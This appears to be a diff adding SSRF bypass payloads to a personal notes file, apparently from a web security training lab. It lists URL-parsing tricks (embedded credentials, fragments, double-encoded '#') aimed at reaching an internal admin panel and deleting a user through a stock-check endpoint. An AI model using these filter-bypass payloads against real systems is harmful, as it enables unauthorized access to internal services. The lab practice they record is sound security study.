@@ -3,3 +3,20 @@ https://expected-host:fakepassword@evil-host
 https://evil-host#expected-host
 
 https://expected-host.evil-host
+
+
+
+
+
+
+
+
+/product/stock
+
+http://localhost%23@stock.weliketoshop.net
+
+http://localhost%2523@stock.weliketoshop.net
+
+http://localhost%2523@stock.weliketoshop.net/admin
+
+http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos
